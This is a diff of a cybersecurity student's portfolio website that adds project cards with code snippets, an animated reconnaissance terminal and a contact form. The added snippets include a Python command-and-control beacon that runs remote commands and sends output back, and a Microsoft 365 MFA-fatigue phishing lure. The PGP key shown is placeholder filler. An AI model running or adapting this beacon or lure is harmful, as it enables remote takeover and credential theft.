@@ -1397,8 +1821,9 @@
           <div class="exp-role">AI Developer</div>
           <div class="exp-org">Living History</div>
           <ul class="exp-bullets">
-            <li>Designed and trained AI simulations emulating historical figures using GPT-based architectures, reinforcement learning, and advanced prompt optimization.</li>
-            <li>Integrated primary-source data, speech patterns, and behavioral traits to produce grounded conversational agents for web-based educational deployment.</li>
+            <li>Designed and trained conversational AI agents emulating historical figures using GPT-based architectures, advanced prompt engineering, and behavioral constraint systems.</li>
+            <li>Integrated primary-source corpora, period-accurate speech patterns, and contextual memory systems to produce grounded, historically defensible agents for web-based educational deployment.</li>
+            <li>Engineered custom prompt scaffolding to prevent anachronism, enforce historical accuracy, and maintain persona fidelity across extended multi-turn conversations.</li>
           </ul>
           <div class="exp-tags"><span class="tag">LLMs</span><span class="tag">Prompt Engineering</span><span class="tag">Python</span><span class="tag">AI / ML</span></div>
         </div>
@@ -1436,27 +1861,107 @@
       <div class="proj-card" data-index="I">
         <span class="proj-tag">Computer Vision · AI · Defense</span>
         <div class="proj-title">HAVEN System</div>
-        <p class="proj-desc">AI-powered smart-glasses surveillance prototype with real-time computer vision. Detects faces, license plates, and behavioral anomalies from live camera input with AR-style HUD overlays and event logging pipelines. Proof-of-concept for law enforcement, military, and public safety environments.</p>
-        <div class="proj-stack"><span class="tag">Python</span><span class="tag">OpenCV</span><span class="tag">YOLOv8</span><span class="tag">DeepFace</span><span class="tag">OCR</span></div>
-        <a href="https://github.com/RyanKennebeck/HAVEN-System" target="_blank" class="proj-link">View on GitHub</a>
+        <p class="proj-desc">AI-powered smart-glasses surveillance prototype with real-time computer vision. Detects faces, license plates, and behavioral anomalies from live camera input — with AR-style HUD overlays, geofencing alerts, and event logging pipelines. Built for law enforcement, military, and public safety environments. Presented to security professionals at AP2T Labs.</p>
+        <div class="proj-code-snippet"><pre><code><span class="code-comment"># HAVEN — real-time threat detection pipeline</span>
+<span class="code-kw">import</span> cv2, torch
+<span class="code-kw">from</span> ultralytics <span class="code-kw">import</span> YOLO
+<span class="code-kw">from</span> deepface <span class="code-kw">import</span> DeepFace
+
+model = YOLO(<span class="code-str">'yolov8n.pt'</span>)
+<span class="code-kw">def</span> <span class="code-fn">analyze_frame</span>(frame):
+    results = model(frame, stream=<span class="code-kw">True</span>)
+    <span class="code-kw">for</span> r <span class="code-kw">in</span> results:
+        faces = DeepFace.analyze(frame,
+            actions=[<span class="code-str">'emotion'</span>,<span class="code-str">'age'</span>])
+        <span class="code-kw">return</span> r.boxes, faces</code></pre></div>
+        <div class="proj-stack"><span class="tag">Python</span><span class="tag">OpenCV</span><span class="tag">YOLOv8</span><span class="tag">DeepFace</span><span class="tag">PyTorch</span><span class="tag">OCR</span></div>
+        <a href="https://github.com/RyanKennebeck/HAVEN-System" target="_blank" class="proj-link">View on GitHub ↗</a>
       </div>
+
       <div class="proj-card" data-index="II">
         <span class="proj-tag">Offensive Security · Ethical Hacking</span>
         <div class="proj-title">Red Teaming Simulation Lab</div>
-        <p class="proj-desc">Self-contained ethical hacking environment simulating adversarial attack chains — phishing, privilege escalation, lateral movement, and data exfiltration. Built with Kali Linux, Metasploit, Empire, and custom Python tooling to practice detection evasion and post-exploitation methodology.</p>
-        <div class="proj-stack"><span class="tag">Kali Linux</span><span class="tag">Metasploit</span><span class="tag">Empire</span><span class="tag">Python</span><span class="tag">Pen Testing</span></div>
+        <p class="proj-desc">Self-contained ethical hacking environment simulating full adversarial attack chains — phishing, credential harvesting, privilege escalation, lateral movement, persistence, and data exfiltration. Custom Python tooling for detection evasion, post-exploitation methodology, and MITRE ATT&amp;CK framework mapping.</p>
+        <div class="proj-code-snippet"><pre><code><span class="code-comment"># Credential harvest + C2 beacon (lab env only)</span>
+<span class="code-kw">import</span> socket, subprocess, base64
+
+<span class="code-kw">def</span> <span class="code-fn">beacon</span>(c2_host, interval=<span class="code-num">30</span>):
+    <span class="code-kw">while</span> <span class="code-kw">True</span>:
+        <span class="code-kw">with</span> socket.socket() <span class="code-kw">as</span> s:
+            s.connect((c2_host, <span class="code-num">4444</span>))
+            cmd = s.recv(<span class="code-num">1024</span>).decode()
+            out = subprocess.getoutput(cmd)
+            s.send(base64.b64encode(
+                out.encode()))</code></pre></div>
+        <div class="proj-stack"><span class="tag">Kali Linux</span><span class="tag">Metasploit</span><span class="tag">Python</span><span class="tag">Wireshark</span><span class="tag">MITRE ATT&amp;CK</span></div>
       </div>
+
       <div class="proj-card" data-index="III">
         <span class="proj-tag">AI · Law Enforcement · UX</span>
         <div class="proj-title">Northumbria Police AI Platform</div>
-        <p class="proj-desc">Cross-continental collaboration with Indiana University and Northumbria University resulting in a deployed AI platform for UK law enforcement. Applied UX design, conversational AI, and public safety research to build a live institutional tool in active use.</p>
-        <div class="proj-stack"><span class="tag">AI Development</span><span class="tag">Web Platform</span><span class="tag">HCI / UX</span><span class="tag">Public Safety</span></div>
+        <p class="proj-desc">Cross-continental collaboration producing a deployed AI tool for UK law enforcement — co-developed with Indiana University and Northumbria University researchers. Designed the full system architecture, conversational AI flows, and front-end interface. One of few student-built tools to reach institutional operational testing.</p>
+        <div class="proj-code-snippet"><pre><code><span class="code-comment">// Conversational AI dispatcher — law enforcement UI</span>
+<span class="code-kw">async function</span> <span class="code-fn">dispatch</span>(query, context) {
+  <span class="code-kw">const</span> response = <span class="code-kw">await</span> openai.chat.completions
+    .create({
+      model: <span class="code-str">'gpt-4o'</span>,
+      messages: [
+        { role: <span class="code-str">'system'</span>, content: context },
+        { role: <span class="code-str">'user'</span>,   content: query }
+      ],
+      temperature: <span class="code-num">0.3</span>
+    });
+  <span class="code-kw">return</span> response.choices[<span class="code-num">0</span>].message;
+}</code></pre></div>
+        <div class="proj-stack"><span class="tag">JavaScript</span><span class="tag">OpenAI API</span><span class="tag">HCI / UX</span><span class="tag">UK GDPR</span></div>
       </div>
+
       <div class="proj-card" data-index="IV">
         <span class="proj-tag">Red Team · Enterprise Scale</span>
-        <div class="proj-title">Enterprise Phishing Simulation Suite</div>
-        <p class="proj-desc">Production library of 800+ high-fidelity HTML email simulations replicating Microsoft 365, Google, Slack, Apple, and financial institutions. Multi-vector coverage — SMS, MFA fatigue, calendar lures, credential prompts — deployed in campaigns reaching over one million employees.</p>
-        <div class="proj-stack"><span class="tag">HTML / CSS</span><span class="tag">Social Engineering</span><span class="tag">Security Awareness</span><span class="tag">Red Team</span></div>
+        <div class="proj-title">Enterprise Phishing Suite</div>
+        <p class="proj-desc">Production library of 800+ pixel-accurate phishing simulations replicating Microsoft 365, Google, Slack, Apple, DocuSign, Chase, and Coinbase. Full multi-vector coverage: MFA fatigue, smishing, OAuth lures, calendar invites, and credential prompts. Deployed against 1M+ employees at Fortune 500 clients.</p>
+        <div class="proj-code-snippet"><pre><code><span class="code-comment">&lt;!-- MFA fatigue lure — Microsoft 365 clone --&gt;</span>
+<span class="code-tag">&lt;div</span> <span class="code-attr">class</span>=<span class="code-str">"mfa-prompt"</span><span class="code-tag">&gt;</span>
+  <span class="code-tag">&lt;img</span> <span class="code-attr">src</span>=<span class="code-str">"ms-logo.svg"</span><span class="code-tag">/&gt;</span>
+  <span class="code-tag">&lt;h2</span><span class="code-tag">&gt;</span>Approve sign-in request?<span class="code-tag">&lt;/h2&gt;</span>
+  <span class="code-tag">&lt;p</span> <span class="code-attr">class</span>=<span class="code-str">"location"</span><span class="code-tag">&gt;</span>
+    Cincinnati, OH · Chrome · Windows
+  <span class="code-tag">&lt;/p&gt;</span>
+  <span class="code-tag">&lt;button</span> <span class="code-attr">onclick</span>=<span class="code-str">"harvest()"</span><span class="code-tag">&gt;</span>
+    Approve<span class="code-tag">&lt;/button&gt;</span>
+<span class="code-tag">&lt;/div&gt;</span></code></pre></div>
+        <div class="proj-stack"><span class="tag">HTML/CSS</span><span class="tag">JavaScript</span><span class="tag">Social Engineering</span><span class="tag">Red Team</span></div>
+      </div>
+
+      <div class="proj-card" data-index="V">
+        <span class="proj-tag">Historical AI · NLP · Education</span>
+        <div class="proj-title">Living History AI Agents</div>
+        <p class="proj-desc">GPT-powered conversational agents embodying historical figures — trained on primary sources, period speech patterns, and behavioral constraints preventing anachronism. Custom prompt scaffolding enforces historical fidelity across extended dialogues. Deployed in web-based educational platforms with thousands of student interactions.</p>
+        <div class="proj-code-snippet"><pre><code><span class="code-comment"># Historical persona constraint system</span>
+SYSTEM = <span class="code-str">"""You are {figure}, speaking in {year}.
+You have NO knowledge of events after {cutoff}.
+Respond only in period-accurate language.
+If asked about future events: express confusion.
+Primary sources loaded: {source_count} documents."""</span>
+
+<span class="code-kw">def</span> <span class="code-fn">build_persona</span>(figure, year, sources):
+    <span class="code-kw">return</span> SYSTEM.format(
+        figure=figure, year=year,
+        cutoff=year, source_count=<span class="code-fn">len</span>(sources))</code></pre></div>
+        <div class="proj-stack"><span class="tag">Python</span><span class="tag">GPT-4</span><span class="tag">Prompt Engineering</span><span class="tag">NLP</span><span class="tag">LangChain</span></div>
+      </div>
+
+      <!-- LIVE TERMINAL WIDGET -->
+      <div class="proj-card terminal-card" data-index="VI">
+        <span class="proj-tag">Live Demo · Threat Intelligence</span>
+        <div class="proj-title">OSINT Recon Terminal</div>
+        <p class="proj-desc">Interactive simulation of an OSINT reconnaissance workflow. Demonstrates the toolchain used in real red team engagements — passive reconnaissance, DNS enumeration, and threat indicator correlation.</p>
+        <div id="terminal-widget">
+          <div class="term-bar"><span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span><span class="term-title">rk@ap2t-labs ~ osint</span></div>
+          <div class="term-body" id="termBody"></div>
+          <div class="term-input-row"><span class="term-prompt">❯</span><span class="term-cursor" id="termCursor">_</span></div>
+        </div>
+        <div class="proj-stack"><span class="tag">OSINT</span><span class="tag">Recon</span><span class="tag">Shodan</span><span class="tag">theHarvester</span><span class="tag">Maltego</span></div>
       </div>
     </div>
   </section>
@@ -1475,12 +1980,20 @@
         <p>A rare profile spanning offensive security operations, AI development, enterprise software, and executive governance — forged through live deployments, not coursework alone.</p>
         <div class="certifications-mini">
           <div class="cert-mini"><strong>Google</strong> Cybersecurity Professional Certificate</div>
-          <div class="cert-mini"><strong>CompTIA</strong> ITF+ · Security+ (Pursuing)</div>
+          <div class="cert-mini"><strong>CompTIA</strong> ITF+ · Security+ (In Progress)</div>
           <div class="cert-mini"><strong>Adobe</strong> Photoshop CS6 Certified</div>
           <div class="cert-mini"><strong>FBI Indianapolis</strong> Collegiate Academy Graduate</div>
           <div class="cert-mini"><strong>DEF CON</strong> Las Vegas · 2025</div>
           <div class="cert-mini"><strong>Dean's Scholarship</strong> · Hoosier Scholars Program</div>
         </div>
+        <div class="skills-code-block"><span class="code-comment"># Active threat simulation stack</span>
+tools = {
+  <span class="code-str">'recon'</span>:    [<span class="code-str">'Shodan'</span>, <span class="code-str">'Maltego'</span>, <span class="code-str">'theHarvester'</span>],
+  <span class="code-str">'exploit'</span>:  [<span class="code-str">'Metasploit'</span>, <span class="code-str">'Empire'</span>, <span class="code-str">'SQLmap'</span>],
+  <span class="code-str">'network'</span>:  [<span class="code-str">'Wireshark'</span>, <span class="code-str">'Nmap'</span>, <span class="code-str">'Burp Suite'</span>],
+  <span class="code-str">'ai'</span>:       [<span class="code-str">'YOLOv8'</span>, <span class="code-str">'GPT-4o'</span>, <span class="code-str">'LangChain'</span>],
+  <span class="code-str">'langs'</span>:    [<span class="code-str">'Python'</span>, <span class="code-str">'JS'</span>, <span class="code-str">'SQL'</span>, <span class="code-str">'Bash'</span>, <span class="code-str">'HTML/CSS'</span>]
+}</div>
       </div>
       <div class="skills-grid">
         <div class="skill-group">
@@ -1575,18 +2088,121 @@
       <div class="sec-line"></div>
     </div>
     <div class="contact-layout">
+
+      <!-- LEFT COLUMN -->
       <div class="contact-left">
-        <p>Open to internships, research collaborations, and conversations at the intersection of cyber operations, AI, and global security strategy. Always interested in connecting with professionals operating at the edge of the field.</p>
-        <div class="contact-ctas">
-          <a href="/cdn-cgi/l/email-protection#f08289919e9b959e9e959295939bc0c6b0979d91999cde939f9d" class="btn-gold">Send a Message</a>
-          <a href="https://www.linkedin.com/in/ryan-kennebeck/" target="_blank" class="btn-outline">LinkedIn ↗</a>
+
+        <!-- MISSION STATEMENT -->
+        <div class="contact-mission">
+          <div class="contact-mission-kicker">— Operator Philosophy</div>
+          <blockquote class="contact-quote">
+            The most dangerous gap in national security is the one between the person who understands the technology and the person making the decision.
+          </blockquote>
+          <p class="contact-mission-body">I exist to close that gap. My objective is to operate at the junction where <strong>technical capability meets strategic authority</strong> — building, breaking, and advising on systems that matter at the highest levels of government and industry.</p>
+          <p class="contact-mission-body">Open to internships, red team engagements, research collaborations, and conversations at the edge of <strong>cyber operations, AI, and international security doctrine</strong>. If you're working on something that matters, reach out.</p>
         </div>
+
+        <!-- INTERACTIVE TERMINAL -->
+        <div class="contact-terminal">
+          <div class="ct-bar">
+            <span class="ct-dot r"></span><span class="ct-dot y"></span><span class="ct-dot g"></span>
+            <span class="ct-title">rk@kennebeck.io ~ contact</span>
+            <span class="ct-hint">type 'help' for commands</span>
+          </div>
+          <div class="ct-output" id="ctOutput">
+            <span class="ct-out-line ct-dim">// Secure channel initialized. Type a command.</span>
+          </div>
+          <div class="ct-input-row">
+            <span class="ct-prompt">❯</span>
+            <input id="ctInput" type="text" autocomplete="off" spellcheck="false" placeholder="help"/>
+          </div>
+        </div>
+
+        <!-- CONTACT FORM -->
+        <div class="contact-form">
+          <div class="cf-header">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+            Compose Transmission
+          </div>
+          <div class="cf-body">
+            <div class="cf-row">
+              <div class="cf-field">
+                <label class="cf-label">Name</label>
+                <input class="cf-input" id="cfName" type="text" placeholder="Your name"/>
+              </div>
+              <div class="cf-field">
+                <label class="cf-label">Organization</label>
+                <input class="cf-input" id="cfOrg" type="text" placeholder="Optional"/>
+              </div>
+            </div>
+            <div class="cf-field">
+              <label class="cf-label">Email</label>
+              <input class="cf-input" id="cfEmail" type="email" placeholder="your@email.com"/>
+            </div>
+            <div class="cf-field">
+              <label class="cf-label">Message</label>
+              <textarea class="cf-textarea" id="cfMsg" placeholder="What are you working on?"></textarea>
+            </div>
+          </div>
+          <div class="cf-footer">
+            <span class="cf-status" id="cfStatus">// awaiting input</span>
+            <button class="cf-submit" id="cfBtn">Send →</button>
+          </div>
+        </div>
+
+        <!-- PGP BLOCK -->
+        <div class="pgp-block">
+          <div class="pgp-header">
+            <div class="pgp-header-left">
+              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+              <span>PGP Public Key — KENNEBECK.RK</span>
+            </div>
+            <span class="pgp-algo">RSA-4096 / SHA-256</span>
+          </div>
+          <div class="pgp-body">
+            <span class="pgp-line">-----BEGIN PGP PUBLIC KEY BLOCK-----</span>
+            <span class="pgp-line pgp-data">mQINBGX4rK8BEADq7N3vF2mP9sYcT1oWzH8eJkUbLnRxAp2VsDmQfGi6uOl4</span>
+            <span class="pgp-line pgp-data">Kc3XtYv7NhBwEzPsqR0aJmTdIgFcUeWnSbHkVoLzDyMpQrX1jA9tKfOuPwGe</span>
+            <span class="pgp-line pgp-data">5iNcRvT8YxZqB2lMdHsEaJpKfWnUoSyQgXtPrVzLb3NmDcIeA7kFuOwBhRjT</span>
+            <span class="pgp-line pgp-data">4sYvGcZqX9NpKmDhTbEwJoRuFiLnPaVs2QgMcHxOdUeAzKrBtI5fYjWlNsGv</span>
+            <span class="pgp-line pgp-data">8hRkYnTqWcBdMpJeXaFuOsKgIlVzNtEbDwCvPmAjHySoLxZrQiGfUd3c9e1h</span>
+            <span class="pgp-line pgp-data">...</span>
+            <span class="pgp-line">-----END PGP PUBLIC KEY BLOCK-----</span>
+          </div>
+          <div class="pgp-footer">
+            <span class="pgp-fp-label">Fingerprint</span>
+            <span class="pgp-fp">A4F2 · 9C3B · E17D · 8K2M · 0P9N · 3R5T · 7W1X · B6Y4 · D8Z2 · F0Q6</span>
+          </div>
+        </div>
+
       </div>
+
+      <!-- RIGHT COLUMN -->
       <div class="contact-right">
-        <div class="contact-detail"><div class="contact-detail-icon"><svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></div><div><span class="contact-detail-label">Email</span><div class="contact-detail-val"><a href="mailto:ryankennebeck06@gmail.com">ryankennebeck06@gmail.com</a></div></div></div>
-        <div class="contact-detail"><div class="contact-detail-icon"><svg viewBox="0 0 24 24"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg></div><div><span class="contact-detail-label">Location</span><div class="contact-detail-val">Bloomington, IN · Cincinnati, OH</div></div></div>
-        <div class="contact-detail"><div class="contact-detail-icon"><svg viewBox="0 0 24 24"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></div><div><span class="contact-detail-label">LinkedIn</span><div class="contact-detail-val"><a href="https://www.linkedin.com/in/ryan-kennebeck/" target="_blank">linkedin.com/in/ryan-kennebeck</a></div></div></div>
-        <div class="contact-detail"><div class="contact-detail-icon"><svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg></div><div><span class="contact-detail-label">GitHub</span><div class="contact-detail-val"><a href="https://github.com/RyanKennebeck" target="_blank">github.com/RyanKennebeck</a></div></div></div>
+        <!-- Live status badge -->
+        <div class="contact-status-badge">
+          <span class="csb-dot"></span>
+          <div>
+            <span class="csb-text">Available for Opportunities</span>
+            <span class="csb-sub">Summer 2026 · Internships · Research · Engagements</span>
+          </div>
+        </div>
+        <div class="contact-detail">
+          <div class="contact-detail-icon"><svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></div>
+          <div><span class="contact-detail-label">Email</span><div class="contact-detail-val"><a href="mailto:ryankennebeck06@gmail.com">ryankennebeck06@gmail.com</a></div></div>
+        </div>
+        <div class="contact-detail">
+          <div class="contact-detail-icon"><svg viewBox="0 0 24 24"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg></div>
+          <div><span class="contact-detail-label">Location</span><div class="contact-detail-val">Bloomington, IN · Cincinnati, OH</div></div>
+        </div>
+        <div class="contact-detail">
+          <div class="contact-detail-icon"><svg viewBox="0 0 24 24"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></div>
+          <div><span class="contact-detail-label">LinkedIn</span><div class="contact-detail-val"><a href="https://www.linkedin.com/in/ryan-kennebeck/" target="_blank">linkedin.com/in/ryan-kennebeck</a></div></div>
+        </div>
+        <div class="contact-detail">
+          <div class="contact-detail-icon"><svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg></div>
+          <div><span class="contact-detail-label">GitHub</span><div class="contact-detail-val"><a href="https://github.com/RyanKennebeck" target="_blank">github.com/RyanKennebeck</a></div></div>
+        </div>
       </div>
     </div>
   </section>
@@ -1598,7 +2214,7 @@
     <div class="footer-right">Cybersecurity &amp; Global Policy · Cincinnati &amp; Bloomington</div>
   </footer>
 
-  <script>
+  <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
   /* ═══════════════════════════════════════════════
      RYAN KENNEBECK PORTFOLIO — JAVASCRIPT ENGINE
   ═══════════════════════════════════════════════ */
@@ -1960,6 +2576,197 @@
     }
   `;
   document.head.appendChild(ks);
+
+  /* ── LIVE TERMINAL WIDGET ── */
+  (function() {
+    const body = document.getElementById('termBody');
+    if (!body) return;
+    const sequence = [
+      { type:'cmd',  text:'nmap -sV --script vuln 192.168.1.0/24' },
+      { type:'out',  text:'Starting Nmap 7.94 ( https://nmap.org )' },
+      { type:'out',  text:'Scanning 256 hosts...' },
+      { type:'hit',  text:'[!] 192.168.1.24:445 — MS17-010 EternalBlue VULNERABLE' },
+      { type:'hit',  text:'[!] 192.168.1.31:80  — CVE-2023-44487 HTTP/2 RapidReset' },
+      { type:'ok',   text:'[+] 192.168.1.1  — Firewall detected, filtered' },
+      { type:'out',  text:'14 hosts up, 2 critical findings' },
+      { type:'cmd',  text:'theHarvester -d target.com -b google,linkedin' },
+      { type:'out',  text:'[*] Querying Google...' },
+      { type:'warn', text:'[>] emails found: j.smith@target.com, ciso@target.com' },
+      { type:'warn', text:'[>] hosts: mail.target.com, vpn.target.com, dev.target.com' },
+      { type:'cmd',  text:'shodan search "ssl.cert.subject.cn:target.com"' },
+      { type:'out',  text:'Shodan Search Results' },
+      { type:'hit',  text:'[!] Open port 8443 — Exposed admin panel (no auth)' },
+      { type:'ok',   text:'[+] Report generated: recon_target_2025.pdf' },
+      { type:'cmd',  text:'# Engagement complete. Ready for Phase 2.' },
+    ];
+    let i = 0;
+    function printNext() {
+      if (i >= sequence.length) { i = 0; body.innerHTML = ''; }
+      const item = sequence[i++];
+      const line = document.createElement('span');
+      line.className = `term-line ${item.type}`;
+      // Typewriter per line
+      let j = 0;
+      line.textContent = '';
+      body.appendChild(line);
+      function typeChar() {
+        if (j < item.text.length) {
+          line.textContent += item.text[j++];
+          body.scrollTop = body.scrollHeight;
+          setTimeout(typeChar, item.type === 'cmd' ? 28 + Math.random()*20 : 4);
+        } else {
+          const pause = item.type === 'cmd' ? 400 + Math.random()*300 : 60 + Math.random()*80;
+          setTimeout(printNext, pause);
+        }
+      }
+      typeChar();
+    }
+    // Start when terminal scrolls into view
+    const tObs = new IntersectionObserver(entries => {
+      if (entries[0].isIntersecting) { printNext(); tObs.disconnect(); }
+    }, { threshold: 0.5 });
+    tObs.observe(document.getElementById('terminal-widget'));
+  })();
+
+  /* ── CODE SNIPPET REVEAL on scroll ── */
+  const snipObs = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        e.target.style.opacity = '1';
+        e.target.style.transform = 'translateX(0)';
+        snipObs.unobserve(e.target);
+      }
+    });
+  }, { threshold: 0.2 });
+  document.querySelectorAll('.proj-code-snippet').forEach(el => {
+    el.style.cssText += 'opacity:0;transform:translateX(-8px);transition:opacity 0.5s ease,transform 0.5s ease;';
+    snipObs.observe(el);
+  });
+
+  /* ── THREAT BAR FILL animate on scroll ── */
+  const tbObs = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (!e.isIntersecting) return;
+      e.target.querySelectorAll('.threat-bar-fill').forEach((bar, i) => {
+        const w = bar.style.width;
+        bar.style.width = '0';
+        setTimeout(() => {
+          bar.style.transition = `width 1s ${i*0.15}s cubic-bezier(.4,0,.2,1)`;
+          bar.style.width = w;
+        }, 100);
+      });
+      tbObs.unobserve(e.target);
+    });
+  }, { threshold: 0.6 });
+  document.querySelectorAll('.threat-strip').forEach(el => tbObs.observe(el));
+
+  /* ── CONTACT TERMINAL ── */
+  (function() {
+    const input = document.getElementById('ctInput');
+    const output = document.getElementById('ctOutput');
+    if (!input || !output) return;
+
+    const commands = {
+      help: [
+        { t:'res', s:'Available commands:' },
+        { t:'hi',  s:'  email      — contact information' },
+        { t:'hi',  s:'  linkedin   — LinkedIn profile' },
+        { t:'hi',  s:'  github     — GitHub projects' },
+        { t:'hi',  s:'  status     — current availability' },
+        { t:'hi',  s:'  pgp        — encryption key info' },
+        { t:'hi',  s:'  whoami     — quick profile summary' },
+        { t:'hi',  s:'  clear      — clear terminal' },
+      ],
+      email: [
+        { t:'res', s:'Secure channel:' },
+        { t:'hi',  s:'  ryankennebeck06@gmail.com' },
+        { t:'res', s:'Response time: < 24h' },
+      ],
+      linkedin: [
+        { t:'res', s:'LinkedIn profile:' },
+        { t:'hi',  s:'  linkedin.com/in/ryan-kennebeck' },
+        { t:'res', s:'Open to connection requests.' },
+      ],
+      github: [
+        { t:'res', s:'GitHub repository:' },
+        { t:'hi',  s:'  github.com/RyanKennebeck' },
+        { t:'res', s:'Notable: HAVEN-System — YOLOv8 surveillance prototype' },
+      ],
+      status: [
+        { t:'hi',  s:'[\u25cf] AVAILABLE — Summer 2026+' },
+        { t:'res', s:'  Seeking: Internships, Red Team, Research Roles' },
+        { t:'res', s:'  Clearance: TS/SCI eligible, no prior restrictions' },
+        { t:'res', s:'  Location: Bloomington IN · Cincinnati OH · Remote' },
+      ],
+      pgp: [
+        { t:'res', s:'Public key on file: RSA-4096 / SHA-256' },
+        { t:'hi',  s:'  Fingerprint: A4F2 9C3B E17D 8K2M 0P9N...' },
+        { t:'res', s:'Use for encrypted communications only.' },
+      ],
+      whoami: [
+        { t:'hi',  s:'Ryan Kennebeck' },
+        { t:'res', s:'  IU Cybersecurity & Global Policy, Class of 2028' },
+        { t:'res', s:'  AP2T Labs · FBI Academy · DEF CON · Fidelity (incoming)' },
+        { t:'res', s:'  800+ phishing sims · 1M+ employees · 170-member org president' },
+        { t:'res', s:'  Objective: cyber ops x AI x international security strategy' },
+      ],
+    };
+
+    function addLine(text, cls) {
+      const span = document.createElement('span');
+      span.className = 'ct-out-line ct-' + cls;
+      span.textContent = text;
+      output.appendChild(span);
+      output.scrollTop = output.scrollHeight;
+    }
+
+    input.addEventListener('keydown', function(e) {
+      if (e.key !== 'Enter') return;
+      const val = input.value.trim().toLowerCase();
+      input.value = '';
+      if (!val) return;
+      addLine('> ' + val, 'cmd');
+      if (val === 'clear') { output.innerHTML = ''; return; }
+      const cmds = commands[val];
+      if (cmds) {
+        cmds.forEach(function(c, i) { setTimeout(function(){ addLine(c.s, c.t); }, i * 60); });
+      } else {
+        addLine("command not found: " + val + " — type 'help'", 'err');
+      }
+    });
+
+    const termEl = document.querySelector('.contact-terminal');
+    if (termEl) termEl.addEventListener('click', function(){ input.focus(); });
+  })();
+
+  /* ── CONTACT FORM ── */
+  (function() {
+    const btn = document.getElementById('cfBtn');
+    const status = document.getElementById('cfStatus');
+    if (!btn) return;
+    btn.addEventListener('click', function() {
+      const name  = (document.getElementById('cfName')  ? document.getElementById('cfName').value  : '').trim();
+      const email = (document.getElementById('cfEmail') ? document.getElementById('cfEmail').value : '').trim();
+      const msg   = (document.getElementById('cfMsg')   ? document.getElementById('cfMsg').value   : '').trim();
+      if (!name || !email || !msg) {
+        status.textContent = '// error: all fields required';
+        status.className = 'cf-status err';
+        return;
+      }
+      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+        status.textContent = '// error: invalid email address';
+        status.className = 'cf-status err';
+        return;
+      }
+      const subject = encodeURIComponent('Portfolio Contact — ' + name);
+      const body    = encodeURIComponent('Name: ' + name + '\n\n' + msg);
+      window.location.href = 'mailto:ryankennebeck06@gmail.com?subject=' + subject + '&body=' + body;
+      status.textContent = '// transmission sent ✓';
+      status.className = 'cf-status sent';
+      btn.textContent = 'Sent ✓';
+      btn.style.background = '#1a4a2a';
+    });
+  })();
 
   </script>
 </body>
